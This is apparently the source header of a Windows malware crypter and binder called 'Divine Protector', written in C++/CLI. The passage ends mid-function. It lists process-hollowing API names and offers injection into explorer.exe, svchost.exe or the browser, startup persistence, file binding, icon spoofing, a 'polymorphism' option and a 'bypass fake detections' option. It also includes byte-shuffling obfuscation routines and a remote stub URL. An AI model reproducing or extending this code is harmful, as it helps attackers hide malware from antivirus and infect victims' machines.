#pragma once

#using <mscorlib.dll>
#include <windows.h>
#include <urlmon.h>
#include <process.h> 
#include <stdio.h>
#include <vcclr.h>
#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "Wininet.lib")
#include <Wininet.h>
#include <aes256.h>

typedef struct _ICONDIRENTRY {
  BYTE bWidth;
  BYTE bHeight;
  BYTE bColorCount;
  BYTE bReserved;
  WORD wPlanes;
  WORD wBitCount;
  DWORD dwBytesInRes;
  DWORD dwImageOffset;
} ICONDIRENTRY, 
 * LPICONDIRENTRY;

typedef struct _ICONDIR {
  WORD idReserved;
  WORD idType;
  WORD idCount;
  ICONDIRENTRY idEntries[1];
} ICONDIR, 
 * LPICONDIR;

#pragma pack(push)
#pragma pack(2)
typedef struct _GRPICONDIRENTRY {
  BYTE bWidth;
  BYTE bHeight;
  BYTE bColorCount;
  BYTE bReserved;
  WORD wPlanes;
  WORD wBitCount;
  DWORD dwBytesInRes;
  WORD nID;
} GRPICONDIRENTRY, 
 * LPGRPICONDIRENTRY;
#pragma pack(pop)

#pragma pack(push)
#pragma pack(2)
typedef struct _GRPICONDIR {
  WORD idReserved;
  WORD idType;
  WORD idCount;
  GRPICONDIRENTRY idEntries[1];
} GRPICONDIR, 
 * LPGRPICONDIR;


namespace GUI {

	

	using namespace System;
	using namespace System::ComponentModel;
	using namespace System::Collections;
	using namespace System::Windows::Forms;
	using namespace System::Data;
	using namespace System::Drawing;
	using namespace System::Runtime::InteropServices;
	using namespace System::Threading;  
 

	[DllImport("user32.dll", EntryPoint = "MessageBox")]
   int MessageBox(void* hWnd, char * lpText, char * lpCaption, 
                  unsigned int uType);


   
   char * argument = "";
   char delay2[] = "";
   char * delay = "";
   char * inject = "";      
   char * start = "";
   char * naziv = "";
   char * ikonica = "";
   char fileb[MAX_PATH] = "";
   char filee[MAX_PATH] = "";
   char * FB = "";
   char * Bind = "";
   DWORD fs;
   DWORD gh;
   bool addstartup = false;
   bool selfinject = true;
   bool eof2 = false;
   bool fake = false;
   char * Key = "Sunce";
   char osnova[MAX_PATH] = "http://divineprotector.com/backups/resource/beta/cgi/";
   char stub[MAX_PATH] = "";
   char * hwid = "";
   bool trid;
   	char RandNum; // name of the string
	char UserLetter[10]; // what the user will enter  and the place of storage in char
	char all[] =  "|kernel32.dll|ntdll.dll|GetProcAddress|GetModuleHandleA|WriteProcessMemory|CreateProcessW|SetThreadContext|GetThreadContext|ResumeThread|FindResourceA|LoadResource|SizeofResource|VirtualAllocEx|NtUnmapViewOfSection|ContinueDebugEvent|WaitForDebugEvent|ReadProcessMemory";
	char all2[] =  "|kernel32.dll|ntdll.dll|GetProcAddress|GetModuleHandleA|WriteProcessMemory|CreateProcessW|SetThreadContext|GetThreadContext|ResumeThread|FindResourceA|LoadResource|SizeofResource|VirtualAllocEx|NtUnmapViewOfSection|ContinueDebugEvent|WaitForDebugEvent|ReadProcessMemory";
			  

	/// <summary>
	/// Summary for Form1
	/// </summary>
	public ref class Form1 : public System::Windows::Forms::Form
	{
	public:
		Form1(void)
		{
			InitializeComponent();
			//
			//TODO: Add the constructor code here
			//
		}

	protected:
		/// <summary>
		/// Clean up any resources being used.
		/// </summary>
		~Form1()
		{
			if (components)
			{
				delete components;
			}
		}

	protected: 

	protected: 



	private: System::Windows::Forms::OpenFileDialog^  openFileDialog1;
	private: System::Windows::Forms::TabControl^  tabControl1;
	private: System::Windows::Forms::TabPage^  tabPage1;
	private: System::Windows::Forms::Button^  button2;
	private: System::Windows::Forms::TextBox^  name;

	private: System::Windows::Forms::TabPage^  tabPage3;
	private: System::Windows::Forms::Button^  button1;
	private: System::Windows::Forms::Label^  label1;
	private: System::Windows::Forms::TextBox^  startup;

	private: System::Windows::Forms::CheckBox^  checkBox1;
	private: System::Windows::Forms::CheckBox^  process;
	private: System::Windows::Forms::CheckBox^  self;


	private: System::Windows::Forms::ListBox^  listBox1;

	private: System::Windows::Forms::CheckBox^  EOF1;
	private: System::Windows::Forms::CheckBox^  fakedetections;
	private: System::Windows::Forms::TabPage^  tabPage4;
	private: System::Windows::Forms::Label^  label2;
	private: System::Windows::Forms::Button^  button3;
	private: System::Windows::Forms::TextBox^  Icons;
	private: System::Windows::Forms::PictureBox^  pictureBox1;
	private: System::Windows::Forms::TextBox^  cmnd;

	private: System::Windows::Forms::CheckBox^  cmd;


	private: System::Windows::Forms::TabPage^  tabPage2;
	private: System::Windows::Forms::WebBrowser^  webBrowser1;
	private: System::Windows::Forms::Label^  label4;
	private: System::Windows::Forms::TextBox^  edelay;
	private: System::Windows::Forms::TabPage^  tabPage5;









	private: System::Windows::Forms::Label^  label5;
	private: System::Windows::Forms::Button^  button4;
	private: System::Windows::Forms::TextBox^  file;

	private: System::Windows::Forms::CheckedListBox^  Files;
	private: System::Windows::Forms::TabPage^  tabPage6;
	private: System::Windows::Forms::Label^  label3;
	private: System::Windows::Forms::TextBox^  rounds;



















	private:
		/// <summary>
		/// Required designer variable.
		/// </summary>
		System::ComponentModel::Container ^components;

#pragma region Windows Form Designer generated code
		/// <summary>
		/// Required method for Designer support - do not modify
		/// the contents of this method with the code editor.
		/// </summary>
		void InitializeComponent(void)
		{
			System::ComponentModel::ComponentResourceManager^  resources = (gcnew System::ComponentModel::ComponentResourceManager(Form1::typeid));
			this->openFileDialog1 = (gcnew System::Windows::Forms::OpenFileDialog());
			this->tabControl1 = (gcnew System::Windows::Forms::TabControl());
			this->tabPage1 = (gcnew System::Windows::Forms::TabPage());
			this->label4 = (gcnew System::Windows::Forms::Label());
			this->edelay = (gcnew System::Windows::Forms::TextBox());
			this->EOF1 = (gcnew System::Windows::Forms::CheckBox());
			this->listBox1 = (gcnew System::Windows::Forms::ListBox());
			this->process = (gcnew System::Windows::Forms::CheckBox());
			this->self = (gcnew System::Windows::Forms::CheckBox());
			this->label1 = (gcnew System::Windows::Forms::Label());
			this->startup = (gcnew System::Windows::Forms::TextBox());
			this->checkBox1 = (gcnew System::Windows::Forms::CheckBox());
			this->button2 = (gcnew System::Windows::Forms::Button());
			this->name = (gcnew System::Windows::Forms::TextBox());
			this->tabPage4 = (gcnew System::Windows::Forms::TabPage());
			this->cmnd = (gcnew System::Windows::Forms::TextBox());
			this->cmd = (gcnew System::Windows::Forms::CheckBox());
			this->label2 = (gcnew System::Windows::Forms::Label());
			this->button3 = (gcnew System::Windows::Forms::Button());
			this->Icons = (gcnew System::Windows::Forms::TextBox());
			this->tabPage6 = (gcnew System::Windows::Forms::TabPage());
			this->label3 = (gcnew System::Windows::Forms::Label());
			this->rounds = (gcnew System::Windows::Forms::TextBox());
			this->tabPage5 = (gcnew System::Windows::Forms::TabPage());
			this->Files = (gcnew System::Windows::Forms::CheckedListBox());
			this->label5 = (gcnew System::Windows::Forms::Label());
			this->button4 = (gcnew System::Windows::Forms::Button());
			this->file = (gcnew System::Windows::Forms::TextBox());
			this->tabPage3 = (gcnew System::Windows::Forms::TabPage());
			this->fakedetections = (gcnew System::Windows::Forms::CheckBox());
			this->button1 = (gcnew System::Windows::Forms::Button());
			this->tabPage2 = (gcnew System::Windows::Forms::TabPage());
			this->webBrowser1 = (gcnew System::Windows::Forms::WebBrowser());
			this->pictureBox1 = (gcnew System::Windows::Forms::PictureBox());
			this->tabControl1->SuspendLayout();
			this->tabPage1->SuspendLayout();
			this->tabPage4->SuspendLayout();
			this->tabPage6->SuspendLayout();
			this->tabPage5->SuspendLayout();
			this->tabPage3->SuspendLayout();
			this->tabPage2->SuspendLayout();
			(cli::safe_cast<System::ComponentModel::ISupportInitialize^  >(this->pictureBox1))->BeginInit();
			this->SuspendLayout();
			// 
			// openFileDialog1
			// 
			this->openFileDialog1->FileName = L"File";
			// 
			// tabControl1
			// 
			this->tabControl1->Controls->Add(this->tabPage1);
			this->tabControl1->Controls->Add(this->tabPage4);
			this->tabControl1->Controls->Add(this->tabPage6);
			this->tabControl1->Controls->Add(this->tabPage5);
			this->tabControl1->Controls->Add(this->tabPage3);
			this->tabControl1->Controls->Add(this->tabPage2);
			this->tabControl1->Location = System::Drawing::Point(24, 104);
			this->tabControl1->Name = L"tabControl1";
			this->tabControl1->SelectedIndex = 0;
			this->tabControl1->Size = System::Drawing::Size(490, 226);
			this->tabControl1->TabIndex = 4;
			// 
			// tabPage1
			// 
			this->tabPage1->BackColor = System::Drawing::Color::FromArgb(static_cast<System::Int32>(static_cast<System::Byte>(60)), static_cast<System::Int32>(static_cast<System::Byte>(60)), 
				static_cast<System::Int32>(static_cast<System::Byte>(60)));
			this->tabPage1->Controls->Add(this->label4);
			this->tabPage1->Controls->Add(this->edelay);
			this->tabPage1->Controls->Add(this->EOF1);
			this->tabPage1->Controls->Add(this->listBox1);
			this->tabPage1->Controls->Add(this->process);
			this->tabPage1->Controls->Add(this->self);
			this->tabPage1->Controls->Add(this->label1);
			this->tabPage1->Controls->Add(this->startup);
			this->tabPage1->Controls->Add(this->checkBox1);
			this->tabPage1->Controls->Add(this->button2);
			this->tabPage1->Controls->Add(this->name);
			this->tabPage1->Cursor = System::Windows::Forms::Cursors::Default;
			this->tabPage1->Location = System::Drawing::Point(4, 24);
			this->tabPage1->Name = L"tabPage1";
			this->tabPage1->Padding = System::Windows::Forms::Padding(3);
			this->tabPage1->Size = System::Drawing::Size(482, 198);
			this->tabPage1->TabIndex = 0;
			this->tabPage1->Text = L"Basic";
			this->tabPage1->Click += gcnew System::EventHandler(this, &Form1::tabPage1_Click);
			// 
			// label4
			// 
			this->label4->AutoSize = true;
			this->label4->ForeColor = System::Drawing::Color::White;
			this->label4->Location = System::Drawing::Point(201, 91);
			this->label4->Name = L"label4";
			this->label4->Size = System::Drawing::Size(155, 15);
			this->label4->TabIndex = 15;
			this->label4->Text = L"Execution Delay(Seconds)";
			// 
			// edelay
			// 
			this->edelay->Cursor = System::Windows::Forms::Cursors::Default;
			this->edelay->Location = System::Drawing::Point(204, 115);
			this->edelay->Name = L"edelay";
			this->edelay->Size = System::Drawing::Size(174, 21);
			this->edelay->TabIndex = 14;
			this->edelay->Text = L"0";
			this->edelay->TextChanged += gcnew System::EventHandler(this, &Form1::textBox1_TextChanged);
			// 
			// EOF1
			// 
			this->EOF1->AutoSize = true;
			this->EOF1->ForeColor = System::Drawing::Color::White;
			this->EOF1->Location = System::Drawing::Point(47, 132);
			this->EOF1->Name = L"EOF1";
			this->EOF1->Size = System::Drawing::Size(48, 19);
			this->EOF1->TabIndex = 11;
			this->EOF1->Text = L"EOF";
			this->EOF1->UseVisualStyleBackColor = true;
			this->EOF1->CheckedChanged += gcnew System::EventHandler(this, &Form1::checkBox2_CheckedChanged_1);
			// 
			// listBox1
			// 
			this->listBox1->Enabled = false;
			this->listBox1->FormattingEnabled = true;
			this->listBox1->ItemHeight = 15;
			this->listBox1->Items->AddRange(gcnew cli::array< System::Object^  >(5) {L"explorer.exe", L"svchost.exe", L"cmd.exe", L"notepad.exe", 
				L"%default browser%"});
			this->listBox1->Location = System::Drawing::Point(313, 122);
			this->listBox1->Name = L"listBox1";
			this->listBox1->Size = System::Drawing::Size(150, 49);
			this->listBox1->TabIndex = 10;
			this->listBox1->Visible = false;
			this->listBox1->SelectedIndexChanged += gcnew System::EventHandler(this, &Form1::listBox1_SelectedIndexChanged);
			// 
			// process
			// 
			this->process->AutoSize = true;
			this->process->ForeColor = System::Drawing::Color::White;
			this->process->Location = System::Drawing::Point(204, 90);
			this->process->Name = L"process";
			this->process->Size = System::Drawing::Size(125, 19);
			this->process->TabIndex = 9;
			this->process->Text = L"Process Injection";
			this->process->UseVisualStyleBackColor = true;
			this->process->Visible = false;
			this->process->CheckedChanged += gcnew System::EventHandler(this, &Form1::process_CheckedChanged);
			// 
			// self
			// 
			this->self->AutoSize = true;
			this->self->Checked = true;
			this->self->CheckState = System::Windows::Forms::CheckState::Checked;
			this->self->ForeColor = System::Drawing::Color::White;
			this->self->Location = System::Drawing::Point(47, 90);
			this->self->Name = L"self";
			this->self->Size = System::Drawing::Size(99, 19);
			this->self->TabIndex = 8;
			this->self->Text = L"Self Injection";
			this->self->UseVisualStyleBackColor = true;
			this->self->CheckedChanged += gcnew System::EventHandler(this, &Form1::checkBox2_CheckedChanged);
			// 
			// label1
			// 
			this->label1->AutoSize = true;
			this->label1->ForeColor = System::Drawing::Color::White;
			this->label1->Location = System::Drawing::Point(289, 76);
			this->label1->Name = L"label1";
			this->label1->Size = System::Drawing::Size(85, 15);
			this->label1->TabIndex = 7;
			this->label1->Text = L"Startup Name";
			this->label1->Visible = false;
			// 
			// startup
			// 
			this->startup->Cursor = System::Windows::Forms::Cursors::Default;
			this->startup->Enabled = false;
			this->startup->Location = System::Drawing::Point(292, 94);
			this->startup->Name = L"startup";
			this->startup->Size = System::Drawing::Size(174, 21);
			this->startup->TabIndex = 6;
			this->startup->Visible = false;
			this->startup->TextChanged += gcnew System::EventHandler(this, &Form1::startup_TextChanged);
			// 
			// checkBox1
			// 
			this->checkBox1->AutoSize = true;
			this->checkBox1->ForeColor = System::Drawing::Color::White;
			this->checkBox1->Location = System::Drawing::Point(292, 54);
			this->checkBox1->Name = L"checkBox1";
			this->checkBox1->Size = System::Drawing::Size(127, 19);
			this->checkBox1->TabIndex = 5;
			this->checkBox1->Text = L"Additional Startup";
			this->checkBox1->UseVisualStyleBackColor = true;
			this->checkBox1->Visible = false;
			this->checkBox1->CheckedChanged += gcnew System::EventHandler(this, &Form1::checkBox1_CheckedChanged);
			// 
			// button2
			// 
			this->button2->Font = (gcnew System::Drawing::Font(L"Arial", 9, System::Drawing::FontStyle::Bold, System::Drawing::GraphicsUnit::Point, 
				static_cast<System::Byte>(0)));
			this->button2->Location = System::Drawing::Point(387, 36);
			this->button2->Margin = System::Windows::Forms::Padding(2);
			this->button2->Name = L"button2";
			this->button2->Size = System::Drawing::Size(72, 27);
			this->button2->TabIndex = 4;
			this->button2->Text = L"Browse";
			this->button2->UseVisualStyleBackColor = true;
			this->button2->Click += gcnew System::EventHandler(this, &Form1::button2_Click_1);
			// 
			// name
			// 
			this->name->BackColor = System::Drawing::SystemColors::Window;
			this->name->Cursor = System::Windows::Forms::Cursors::Default;
			this->name->Font = (gcnew System::Drawing::Font(L"Arial", 9, System::Drawing::FontStyle::Bold, System::Drawing::GraphicsUnit::Point, 
				static_cast<System::Byte>(0)));
			this->name->Location = System::Drawing::Point(47, 39);
			this->name->Margin = System::Windows::Forms::Padding(2);
			this->name->Name = L"name";
			this->name->Size = System::Drawing::Size(326, 21);
			this->name->TabIndex = 2;
			// 
			// tabPage4
			// 
			this->tabPage4->BackColor = System::Drawing::Color::FromArgb(static_cast<System::Int32>(static_cast<System::Byte>(60)), static_cast<System::Int32>(static_cast<System::Byte>(60)), 
				static_cast<System::Int32>(static_cast<System::Byte>(60)));
			this->tabPage4->Controls->Add(this->cmnd);
			this->tabPage4->Controls->Add(this->cmd);
			this->tabPage4->Controls->Add(this->label2);
			this->tabPage4->Controls->Add(this->button3);
			this->tabPage4->Controls->Add(this->Icons);
			this->tabPage4->Location = System::Drawing::Point(4, 24);
			this->tabPage4->Name = L"tabPage4";
			this->tabPage4->Size = System::Drawing::Size(482, 198);
			this->tabPage4->TabIndex = 3;
			this->tabPage4->Text = L"Advanced";
			// 
			// cmnd
			// 
			this->cmnd->BackColor = System::Drawing::SystemColors::Window;
			this->cmnd->Cursor = System::Windows::Forms::Cursors::Default;
			this->cmnd->Font = (gcnew System::Drawing::Font(L"Arial", 9, System::Drawing::FontStyle::Bold, System::Drawing::GraphicsUnit::Point, 
				static_cast<System::Byte>(0)));
			this->cmnd->Location = System::Drawing::Point(37, 129);
			this->cmnd->Margin = System::Windows::Forms::Padding(2);
			this->cmnd->Name = L"cmnd";
			this->cmnd->Size = System::Drawing::Size(326, 21);
			this->cmnd->TabIndex = 12;
			this->cmnd->TextChanged += gcnew System::EventHandler(this, &Form1::cmnd_TextChanged);
			// 
			// cmd
			// 
			this->cmd->AutoSize = true;
			this->cmd->ForeColor = System::Drawing::Color::White;
			this->cmd->Location = System::Drawing::Point(37, 105);
			this->cmd->Name = L"cmd";
			this->cmd->Size = System::Drawing::Size(177, 19);
			this->cmd->TabIndex = 11;
			this->cmd->Text = L"Command Line Arguments";
			this->cmd->UseVisualStyleBackColor = true;
			// 
			// label2
			// 
			this->label2->AutoSize = true;
			this->label2->ForeColor = System::Drawing::Color::White;
			this->label2->Location = System::Drawing::Point(34, 39);
			this->label2->Name = L"label2";
			this->label2->Size = System::Drawing::Size(82, 15);
			this->label2->TabIndex = 10;
			this->label2->Text = L"Icon Changer";
			// 
			// button3
			// 
			this->button3->Font = (gcnew System::Drawing::Font(L"Arial", 9, System::Drawing::FontStyle::Bold, System::Drawing::GraphicsUnit::Point, 
				static_cast<System::Byte>(0)));
			this->button3->Location = System::Drawing::Point(377, 62);
			this->button3->Margin = System::Windows::Forms::Padding(2);
			this->button3->Name = L"button3";
			this->button3->Size = System::Drawing::Size(72, 27);
			this->button3->TabIndex = 9;
			this->button3->Text = L"Browse";
			this->button3->UseVisualStyleBackColor = true;
			this->button3->Click += gcnew System::EventHandler(this, &Form1::button3_Click);
			// 
			// Icons
			// 
			this->Icons->BackColor = System::Drawing::SystemColors::Window;
			this->Icons->Cursor = System::Windows::Forms::Cursors::Default;
			this->Icons->Font = (gcnew System::Drawing::Font(L"Arial", 9, System::Drawing::FontStyle::Bold, System::Drawing::GraphicsUnit::Point, 
				static_cast<System::Byte>(0)));
			this->Icons->Location = System::Drawing::Point(37, 65);
			this->Icons->Margin = System::Windows::Forms::Padding(2);
			this->Icons->Name = L"Icons";
			this->Icons->Size = System::Drawing::Size(326, 21);
			this->Icons->TabIndex = 8;
			// 
			// tabPage6
			// 
			this->tabPage6->BackColor = System::Drawing::Color::FromArgb(static_cast<System::Int32>(static_cast<System::Byte>(60)), static_cast<System::Int32>(static_cast<System::Byte>(60)), 
				static_cast<System::Int32>(static_cast<System::Byte>(60)));
			this->tabPage6->Controls->Add(this->label3);
			this->tabPage6->Controls->Add(this->rounds);
			this->tabPage6->Location = System::Drawing::Point(4, 24);
			this->tabPage6->Name = L"tabPage6";
			this->tabPage6->Size = System::Drawing::Size(482, 198);
			this->tabPage6->TabIndex = 6;
			this->tabPage6->Text = L"Polymorphism";
			// 
			// label3
			// 
			this->label3->AutoSize = true;
			this->label3->BackColor = System::Drawing::Color::Transparent;
			this->label3->ForeColor = System::Drawing::Color::White;
			this->label3->Location = System::Drawing::Point(317, 36);
			this->label3->Name = L"label3";
			this->label3->Size = System::Drawing::Size(143, 15);
			this->label3->TabIndex = 15;
			this->label3->Text = L"Split Resource(Number)";
			this->label3->Click += gcnew System::EventHandler(this, &Form1::label3_Click);
			// 
			// rounds
			// 
			this->rounds->Location = System::Drawing::Point(320, 54);
			this->rounds->Name = L"rounds";
			this->rounds->Size = System::Drawing::Size(140, 21);
			this->rounds->TabIndex = 14;
			this->rounds->Text = L"4";
			this->rounds->TextChanged += gcnew System::EventHandler(this, &Form1::rounds_TextChanged);
			// 
			// tabPage5
			// 
			this->tabPage5->BackColor = System::Drawing::Color::FromArgb(static_cast<System::Int32>(static_cast<System::Byte>(60)), static_cast<System::Int32>(static_cast<System::Byte>(60)), 
				static_cast<System::Int32>(static_cast<System::Byte>(60)));
			this->tabPage5->Controls->Add(this->Files);
			this->tabPage5->Controls->Add(this->label5);
			this->tabPage5->Controls->Add(this->button4);
			this->tabPage5->Controls->Add(this->file);
			this->tabPage5->Location = System::Drawing::Point(4, 24);
			this->tabPage5->Name = L"tabPage5";
			this->tabPage5->Size = System::Drawing::Size(482, 198);
			this->tabPage5->TabIndex = 5;
			this->tabPage5->Text = L"File Binder";
			// 
			// Files
			// 
			this->Files->FormattingEnabled = true;
			this->Files->Location = System::Drawing::Point(35, 63);
			this->Files->Name = L"Files";
			this->Files->Size = System::Drawing::Size(411, 116);
			this->Files->TabIndex = 14;
			this->Files->SelectedIndexChanged += gcnew System::EventHandler(this, &Form1::checkedListBox1_SelectedIndexChanged);
			// 
			// label5
			// 
			this->label5->AutoSize = true;
			this->label5->ForeColor = System::Drawing::Color::White;
			this->label5->Location = System::Drawing::Point(32, 12);
			this->label5->Name = L"label5";
			this->label5->Size = System::Drawing::Size(68, 15);
			this->label5->TabIndex = 13;
			this->label5->Text = L"File to Bind";
			// 
			// button4
			// 
			this->button4->Font = (gcnew System::Drawing::Font(L"Arial", 9, System::Drawing::FontStyle::Bold, System::Drawing::GraphicsUnit::Point, 
				static_cast<System::Byte>(0)));
			this->button4->Location = System::Drawing::Point(374, 26);
			this->button4->Margin = System::Windows::Forms::Padding(2);
			this->button4->Name = L"button4";
			this->button4->Size = System::Drawing::Size(72, 27);
			this->button4->TabIndex = 12;
			this->button4->Text = L"Browse";
			this->button4->UseVisualStyleBackColor = true;
			this->button4->Click += gcnew System::EventHandler(this, &Form1::button4_Click);
			// 
			// file
			// 
			this->file->BackColor = System::Drawing::SystemColors::Window;
			this->file->Cursor = System::Windows::Forms::Cursors::Default;
			this->file->Font = (gcnew System::Drawing::Font(L"Arial", 9, System::Drawing::FontStyle::Bold, System::Drawing::GraphicsUnit::Point, 
				static_cast<System::Byte>(0)));
			this->file->Location = System::Drawing::Point(35, 29);
			this->file->Margin = System::Windows::Forms::Padding(2);
			this->file->Name = L"file";
			this->file->Size = System::Drawing::Size(326, 21);
			this->file->TabIndex = 11;
			// 
			// tabPage3
			// 
			this->tabPage3->BackColor = System::Drawing::Color::FromArgb(static_cast<System::Int32>(static_cast<System::Byte>(60)), static_cast<System::Int32>(static_cast<System::Byte>(60)), 
				static_cast<System::Int32>(static_cast<System::Byte>(60)));
			this->tabPage3->Controls->Add(this->fakedetections);
			this->tabPage3->Controls->Add(this->button1);
			this->tabPage3->Location = System::Drawing::Point(4, 24);
			this->tabPage3->Name = L"tabPage3";
			this->tabPage3->Size = System::Drawing::Size(482, 198);
			this->tabPage3->TabIndex = 2;
			this->tabPage3->Text = L"Crypt";
			this->tabPage3->Click += gcnew System::EventHandler(this, &Form1::tabPage3_Click);
			// 
			// fakedetections
			// 
			this->fakedetections->AutoSize = true;
			this->fakedetections->ForeColor = System::Drawing::Color::White;
			this->fakedetections->Location = System::Drawing::Point(55, 47);
			this->fakedetections->Name = L"fakedetections";
			this->fakedetections->Size = System::Drawing::Size(269, 19);
			this->fakedetections->TabIndex = 1;
			this->fakedetections->Text = L"Bypass Fake Detections (Increase FileSize)";
			this->fakedetections->UseVisualStyleBackColor = true;
			this->fakedetections->CheckedChanged += gcnew System::EventHandler(this, &Form1::fakedetections_CheckedChanged);
			// 
			// button1
			// 
			this->button1->Location = System::Drawing::Point(321, 128);
			this->button1->Name = L"button1";
			this->button1->Size = System::Drawing::Size(99, 30);
			this->button1->TabIndex = 0;
			this->button1->Text = L"Protect ";
			this->button1->UseVisualStyleBackColor = true;
			this->button1->Click += gcnew System::EventHandler(this, &Form1::button1_Click);
			// 
			// tabPage2
			// 
			this->tabPage2->BackColor = System::Drawing::Color::FromArgb(static_cast<System::Int32>(static_cast<System::Byte>(60)), static_cast<System::Int32>(static_cast<System::Byte>(60)), 
				static_cast<System::Int32>(static_cast<System::Byte>(60)));
			this->tabPage2->Controls->Add(this->webBrowser1);
			this->tabPage2->Location = System::Drawing::Point(4, 24);
			this->tabPage2->Name = L"tabPage2";
			this->tabPage2->Size = System::Drawing::Size(482, 198);
			this->tabPage2->TabIndex = 4;
			this->tabPage2->Text = L"Scanner";
			// 
			// webBrowser1
			// 
			this->webBrowser1->Location = System::Drawing::Point(3, 3);
			this->webBrowser1->MinimumSize = System::Drawing::Size(20, 20);
			this->webBrowser1->Name = L"webBrowser1";
			this->webBrowser1->Size = System::Drawing::Size(474, 192);
			this->webBrowser1->TabIndex = 4;
			this->webBrowser1->Url = (gcnew System::Uri(L"http://multiscanner.org/api_scanner_frame.php\?api_seller_id=33&api_customer_key=4" 
				L"79989206185564416", 
				System::UriKind::Absolute));
			// 
			// pictureBox1
			// 
			this->pictureBox1->Image = (cli::safe_cast<System::Drawing::Image^  >(resources->GetObject(L"pictureBox1.Image")));
			this->pictureBox1->InitialImage = (cli::safe_cast<System::Drawing::Image^  >(resources->GetObject(L"pictureBox1.InitialImage")));
			this->pictureBox1->Location = System::Drawing::Point(138, 30);
			this->pictureBox1->Name = L"pictureBox1";
			this->pictureBox1->Size = System::Drawing::Size(350, 47);
			this->pictureBox1->TabIndex = 5;
			this->pictureBox1->TabStop = false;
			// 
			// Form1
			// 
			this->AutoScaleDimensions = System::Drawing::SizeF(7, 15);
			this->AutoScaleMode = System::Windows::Forms::AutoScaleMode::Font;
			this->BackColor = System::Drawing::Color::FromArgb(static_cast<System::Int32>(static_cast<System::Byte>(34)), static_cast<System::Int32>(static_cast<System::Byte>(34)), 
				static_cast<System::Int32>(static_cast<System::Byte>(34)));
			this->ClientSize = System::Drawing::Size(539, 345);
			this->Controls->Add(this->pictureBox1);
			this->Controls->Add(this->tabControl1);
			this->Cursor = System::Windows::Forms::Cursors::Default;
			this->Font = (gcnew System::Drawing::Font(L"Arial", 9, System::Drawing::FontStyle::Bold, System::Drawing::GraphicsUnit::Point, static_cast<System::Byte>(0)));
			this->ForeColor = System::Drawing::Color::FromArgb(static_cast<System::Int32>(static_cast<System::Byte>(5)), static_cast<System::Int32>(static_cast<System::Byte>(5)), 
				static_cast<System::Int32>(static_cast<System::Byte>(5)));
			this->Icon = (cli::safe_cast<System::Drawing::Icon^  >(resources->GetObject(L"$this.Icon")));
			this->Name = L"Form1";
			this->StartPosition = System::Windows::Forms::FormStartPosition::CenterScreen;
			this->Text = L"Divine Protector";
			this->Load += gcnew System::EventHandler(this, &Form1::Form1_Load);
			this->tabControl1->ResumeLayout(false);
			this->tabPage1->ResumeLayout(false);
			this->tabPage1->PerformLayout();
			this->tabPage4->ResumeLayout(false);
			this->tabPage4->PerformLayout();
			this->tabPage6->ResumeLayout(false);
			this->tabPage6->PerformLayout();
			this->tabPage5->ResumeLayout(false);
			this->tabPage5->PerformLayout();
			this->tabPage3->ResumeLayout(false);
			this->tabPage3->PerformLayout();
			this->tabPage2->ResumeLayout(false);
			(cli::safe_cast<System::ComponentModel::ISupportInitialize^  >(this->pictureBox1))->EndInit();
			this->ResumeLayout(false);

		}



#pragma endregion
	private: System::Void saveFileDialog1_FileOk(System::Object^  sender, System::ComponentModel::CancelEventArgs^  e) {
			 }

			 int Write(int q,int g)
{

	FB[g] = char(q);


	return 0;

}


void shift(char p[])
{
    
   int g=0,g1=0,g2=0,g3=0,g4=0,g5=0,g6=0,g7=0,g8=0,g9=0,g10=0,g11=0,g12=0,g13=0,g14=0,g15=0;
   int i,l;

   l = strlen(p);

   for ( i = 0;i < l - (l % 16);i++)
   {

   g = int(p[i]);
   g = g + 3;

   g1 = int(p[i+1]);
   g1 = g1 + 3;

   g2 = int(p[i+2]);
   g2 = g2 + 3;

   g3 = int(p[i+3]);
   g3 = g3 + 3;

   g4 = int(p[i+4]);
   g4 = g4 + 3;

   g5 = int(p[i+5]);
   g5 = g5 + 3;

   g6 = int(p[i+6]);
   g6 = g6 + 3;

   g7 = int(p[i+7]);
   g7 = g7 + 3;

    g8 = int(p[i+8]);
   g8 = g8 + 3;

   g9 = int(p[i+9]);
   g9 = g9+ 3;

   g10 = int(p[i+10]);
   g10 = g10+ 3;

   g11 = int(p[i+11]);
   g11 = g11 + 3;

   g12= int(p[i+12]);
   g12= g12+ 3;

   g13= int(p[i+13]);
   g13= g13+ 3;

   g14= int(p[i+14]);
   g14= g14 + 3;

   g15= int(p[i+15]);
   g15= g15 + 3;




   
   if (g != 0)
   {
   Write(g7,i);
   }
   
   if (g1 != 0)
   {
   Write(g13,i+1);
   }

   if (g2 != 0)
   {
   Write(g9,i+2);
   }

   if (g3 != 0)
   {
   Write(g11,i+3);
   }

    
   if (g4 != 0)
   {
   Write(g12,i+4);
   }
   
   if (g5 != 0)
   {
   Write(g10,i+5);
   }

   if (g6 != 0)
   {
   Write(g14,i+6);
   }

   if (g7 != 0)
   {
   Write(g,i+7);
   }

    if (g8 != 0)
   {
   Write(g15,i+8);
   }
   
   if (g9 != 0)
   {
   Write(g2,i+9);
   }

   if (g10 != 0)
   {
   Write(g5,i+10);
   }

   if (g11 != 0)
   {
   Write(g3,i+11);
   }

    
   if (g12 != 0)
   {
   Write(g4,i+12);
   }
   
   if (g13 != 0)
   {
   Write(g1,i+13);
   }

   if (g14 != 0)
   {
   Write(g6,i+14);
   }

   if (g15 != 0)
   {
   Write(g8,i+15);
   }



   




   i = i + 15;
   

   }
    
   if(l % 16 != 0)
   {
    
   for(i = 0;i < l % 16;i++)
   {
   Write(p[l-i],l-i);
   }


   }

}

void unshift(char p[])
{
    
   int g=0,g1=0,g2=0,g3=0,g4=0,g5=0,g6=0,g7=0,g8=0,g9=0,g10=0,g11=0,g12=0,g13=0,g14=0,g15=0;
   int i,l;

   l = strlen(p);

   for ( i = 0;i < l - (l % 16);i++)
   {

   g = int(p[i]);
   g = g - 3;

   g1 = int(p[i+1]);
   g1 = g1 - 3;

   g2 = int(p[i+2]);
   g2 = g2 - 3;

   g3 = int(p[i+3]);
   g3 = g3 - 3;

   g4 = int(p[i+4]);
   g4 = g4 - 3;

   g5 = int(p[i+5]);
   g5 = g5 - 3;

   g6 = int(p[i+6]);
   g6 = g6 - 3;

   g7 = int(p[i+7]);
   g7 = g7 - 3;

    g8 = int(p[i+8]);
   g8 = g8 - 3;

   g9 = int(p[i+9]);
   g9 = g9- 3;

   g10 = int(p[i+10]);
   g10 = g10- 3;

   g11 = int(p[i+11]);
   g11 = g11 - 3;

   g12= int(p[i+12]);
   g12= g12- 3;

   g13= int(p[i+13]);
   g13= g13- 3;

   g14= int(p[i+14]);
   g14= g14 - 3;

   g15= int(p[i+15]);
